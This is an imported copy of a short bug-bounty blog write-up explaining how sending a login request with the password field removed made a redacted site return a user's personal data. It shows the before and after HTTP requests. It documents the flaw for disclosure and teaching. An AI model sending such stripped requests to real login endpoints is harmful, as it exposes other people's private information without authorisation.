---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-03_a-weird-bug-that-leaked-pii_2.md
original_filename: 2023-02-03_a-weird-bug-that-leaked-pii_2.md
title: A weird bug that leaked PII
category: documents
detected_topics:
- command-injection
- cors
- information-disclosure
tags:
- imported
- documents
- command-injection
- cors
- information-disclosure
language: en
raw_sha256: c9d72895ef5b04cd0d2bdca404411a39f1637dcfe1086444e2e7b5b962ba176f
text_sha256: 0d6e8003978600fbe4d9822029f84a63f40e723fd36ebe85ccdd50cfa7668202
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# A weird bug that leaked PII

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-03_a-weird-bug-that-leaked-pii_2.md
- Source Type: markdown
- Detected Topics: command-injection, cors, information-disclosure
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `c9d72895ef5b04cd0d2bdca404411a39f1637dcfe1086444e2e7b5b962ba176f`
- Text SHA256: `0d6e8003978600fbe4d9822029f84a63f40e723fd36ebe85ccdd50cfa7668202`


## Content

---
title: "A weird bug that leaked PII"
page_title: "Medium"
url: "https://medium.com/@jawadmahdi/a-weird-bug-that-leaked-pii-9e2e91a8b8c8"
authors: ["Jawad Mahdi (@hunter0x1)"]
bugs: ["Information disclosure"]
publication_date: "2023-02-03"
added_date: "2023-06-25"
source: "pentester.land/writeups.json"
original_index: 1580
scraped_via: "browseros"
---

# A weird bug that leaked PII

Jawad Mahdi
 highlighted

A weird bug that leaked PII
Jawad Mahdi
Follow
2 min read
·
Feb 4, 2023

168

3

Hello guys, I’m back again with a bug that I want to share with you all. I was working on this program and its functionality when I encountered a bug for the first time. Although I encountered this bug last year, I am now sharing it with you all. Let’s get to the point. I was using the credentials provided for testing, I submitted my username and password and received the following request:

POST /auth?subdomain=test&commonLoginQuery=true HTTP/1.1
Host: redact.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 25
Origin: redact.com
Referer: redact.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"login":"test@gmail.com, "password": "test1337"}

I just removed the password field along with its value from the request and it looked like this:

POST /auth?subdomain=test&commonLoginQuery=true HTTP/1.1
Host: redact.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 25
Origin: redact.com
Referer: redact.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"login":"test@gmail.com"}

Then the PII of this user got leaked and it was showing private information.

Get Jawad Mahdi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Here is the response I received:

Press enter or click to view image in full size

Sometimes, you need to experiment with the input field and deal with some unexpected behaviors. This is why it’s important to perform manual testing instead of just relying on fuzzing and potentially causing harm to the site.
